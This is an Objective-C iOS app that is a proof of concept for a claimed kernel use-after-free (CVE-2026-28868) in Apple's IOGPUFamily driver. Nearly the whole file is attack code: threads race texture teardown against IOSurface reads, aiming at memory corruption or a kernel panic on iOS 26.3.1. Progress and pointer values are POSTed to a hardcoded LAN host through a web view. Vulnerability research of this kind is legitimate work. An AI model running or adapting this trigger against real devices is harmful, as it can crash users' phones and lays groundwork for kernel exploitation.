/*
 * iogpu_surface_uaf.m — CVE-2026-28868 PoC
 * IOGPUFamily teardown UAF via IOSurface-backed MTLTexture race
 *
 * Bug: IOGPUFamily teardown function (rel=0x68ac in 26.3.1) releases
 * IOSurface reference at obj+0xd8+8 without holding a lock. A concurrent
 * reader that accesses the same IOSurface binding can use the freed pointer.
 *
 * Race:
 *   Thread A: release MTLTexture → IOGPUFamily teardown → frees IOSurface ref
 *   Thread B: access surface binding via IOSurface API concurrently
 *
 * Observable if race is won: kernel panic or IOSurface ID lookup failure
 * while Thread B still holds a surface reference.
 *
 * Platform: iOS 26.3.1, iPhone 16 Pro Max (AGXG18P)
 * Build: see Makefile / GitHub Actions workflow
 */

#import <UIKit/UIKit.h>
#import <Metal/Metal.h>
#import <IOSurface/IOSurface.h>
#import <WebKit/WebKit.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/types.h>

#define REPORT_HOST "192.168.68.106"
#define REPORT_PORT 9999
#define RACE_ITERS  500000

static id<MTLDevice>  g_dev   = nil;
static WKWebView     *g_wv    = nil;
static _Atomic int    g_stop  = 0;
static _Atomic int    g_hits  = 0;
static _Atomic int    g_iter  = 0;

static void report(const char *msg) {
    NSLog(@"[UAF] %s", msg);
    WKWebView *wv = g_wv;
    if (!wv) return;
    NSString *s = [NSString stringWithUTF8String:msg];
    if (!s) return;
    s = [s stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *u = [NSString stringWithFormat:@"http://%s:%d/", REPORT_HOST, REPORT_PORT];
    NSString *js = [NSString stringWithFormat:
        @"var r=new XMLHttpRequest();r.open('POST','%@',true);r.send('[cve28868] %@');", u, s];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:js completionHandler:nil];
    });
}

static void evf(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    report(buf);
}

/* Create an IOSurface-backed MTLTexture. Returns the texture and surface. */
static id<MTLTexture> make_texture(IOSurfaceRef *surf_out) {
    NSDictionary *props = @{
        (__bridge NSString *)kIOSurfaceWidth:  @(256),
        (__bridge NSString *)kIOSurfaceHeight: @(256),
        (__bridge NSString *)kIOSurfaceBytesPerElement: @(4),
        (__bridge NSString *)kIOSurfacePixelFormat: @(0x42475241),  // 'BGRA'
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return nil;

    MTLTextureDescriptor *td = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                                                                                  width:256
                                                                                 height:256
                                                                              mipmapped:NO];
    td.usage = MTLTextureUsageShaderRead | MTLTextureUsageShaderWrite;
    td.storageMode = MTLStorageModeShared;

    id<MTLTexture> tex = [g_dev newTextureWithDescriptor:td iosurface:surf plane:0];
    if (!tex) { CFRelease(surf); return nil; }

    if (surf_out) *surf_out = surf;
    return tex;
}

/*
 * Thread B — reader: continuously access the IOSurface while Thread A tears down.
 * If the kernel's reference is freed but the call still proceeds, UAF.
 */
static void *reader_thread(void *arg) {
    IOSurfaceRef *surfs = (IOSurfaceRef *)arg;
    int n_surfs = 8;

    while (!atomic_load(&g_stop)) {
        int it = atomic_fetch_add(&g_iter, 1);
        if (it >= RACE_ITERS) { atomic_store(&g_stop, 1); break; }

        /* Rotate through multiple surfaces to catch the race */
        int idx = it % n_surfs;
        IOSurfaceRef s = surfs[idx];
        if (!s) continue;

        /* Access surface from kernel side — if freed, this reads UAF memory */
        uint32_t w = IOSurfaceGetWidth(s);
        uint32_t h = IOSurfaceGetHeight(s);
        uint32_t seed = IOSurfaceGetSeed(s);
        IOSurfaceID sid = IOSurfaceGetID(s);

        /* Heuristic: if width/height is corrupted, UAF occurred */
        if (w > 0x10000 || h > 0x10000 || w == 0 || h == 0) {
            int hits = atomic_fetch_add(&g_hits, 1) + 1;
            evf("UAF_INDICATOR it=%d idx=%d w=%u h=%u seed=%u sid=%u hits=%d",
                it, idx, w, h, seed, (unsigned)sid, hits);
            if (hits >= 3) {
                atomic_store(&g_stop, 1);
                evf("UAF CONFIRMED after %d hits", hits);
                break;
            }
        }
    }
    return NULL;
}

/*
 * Thread A — destroyer: repeatedly create/destroy IOSurface-backed textures.
 * Trigger the teardown at rel=0x68ac.
 */
static void *destroyer_thread(void *arg) {
    IOSurfaceRef *surfs = (IOSurfaceRef *)arg;
    int n_surfs = 8;

    while (!atomic_load(&g_stop)) {
        int it = atomic_load(&g_iter);
        if (it >= RACE_ITERS) break;

        /* Rotate destruction across multiple surfaces */
        int idx = it % n_surfs;

        /* Re-create texture on same surface (forces teardown of previous binding) */
        IOSurfaceRef s = surfs[idx];
        if (!s) continue;

        @autoreleasepool {
            MTLTextureDescriptor *td = [MTLTextureDescriptor
                texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                width:256 height:256 mipmapped:NO];
            td.usage = MTLTextureUsageShaderRead;
            td.storageMode = MTLStorageModeShared;

            /* This re-bind triggers teardown of previous IOSurface reference */
            id<MTLTexture> t = [g_dev newTextureWithDescriptor:td iosurface:s plane:0];
            /* Immediately release → triggers teardown → races with reader */
            t = nil;
        }
    }
    return NULL;
}

static void run_uaf_test(void) {
    evf("START CVE-2026-28868 IOSurface-MTLTexture UAF race");
    evf("Device: %s", g_dev.name.UTF8String);

    /* Create pool of IOSurfaces */
    int n_surfs = 8;
    IOSurfaceRef surfs[8];
    memset(surfs, 0, sizeof(surfs));

    for (int i = 0; i < n_surfs; i++) {
        NSDictionary *props = @{
            (__bridge NSString *)kIOSurfaceWidth:  @(256),
            (__bridge NSString *)kIOSurfaceHeight: @(256),
            (__bridge NSString *)kIOSurfaceBytesPerElement: @(4),
            (__bridge NSString *)kIOSurfacePixelFormat: @(0x42475241),
        };
        surfs[i] = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        evf("surf[%d] id=%u ptr=%p", i, (unsigned)IOSurfaceGetID(surfs[i]), surfs[i]);
    }

    /* Initial texture creation to bind surfaces */
    for (int i = 0; i < n_surfs; i++) {
        IOSurfaceRef s = surfs[i];
        MTLTextureDescriptor *td = [MTLTextureDescriptor
            texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
            width:256 height:256 mipmapped:NO];
        td.usage = MTLTextureUsageShaderRead;
        td.storageMode = MTLStorageModeShared;
        id<MTLTexture> t = [g_dev newTextureWithDescriptor:td iosurface:s plane:0];
        (void)t;
        /* Don't hold reference — let it be released immediately */
    }

    evf("STARTING RACE (iters=%d)", RACE_ITERS);
    atomic_store(&g_stop, 0);
    atomic_store(&g_hits, 0);
    atomic_store(&g_iter, 0);

    /* Spawn threads */
    pthread_t threads[8];
    int t = 0;

    /* 2 destroyer threads */
    pthread_create(&threads[t++], NULL, destroyer_thread, surfs);
    pthread_create(&threads[t++], NULL, destroyer_thread, surfs);

    /* 4 reader threads */
    pthread_create(&threads[t++], NULL, reader_thread, surfs);
    pthread_create(&threads[t++], NULL, reader_thread, surfs);
    pthread_create(&threads[t++], NULL, reader_thread, surfs);
    pthread_create(&threads[t++], NULL, reader_thread, surfs);

    /* Join all threads */
    for (int i = 0; i < t; i++) pthread_join(threads[i], NULL);

    int total_hits = atomic_load(&g_hits);
    int total_iter = atomic_load(&g_iter);
    evf("DONE: iters=%d hits=%d %s",
        total_iter, total_hits,
        total_hits > 0 ? "UAF_LIKELY" : "NO_CORRUPTION");

    /* Cleanup */
    for (int i = 0; i < n_surfs; i++) {
        if (surfs[i]) CFRelease(surfs[i]);
    }
}

/* === App boilerplate === */

@interface ViewController : UIViewController
@end

@implementation ViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    g_wv = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:cfg];
    [self.view addSubview:g_wv];

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) {
        NSLog(@"[UAF] No Metal device");
        return;
    }

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        run_uaf_test();
    });
}
@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [ViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, @"AppDelegate");
    }
}
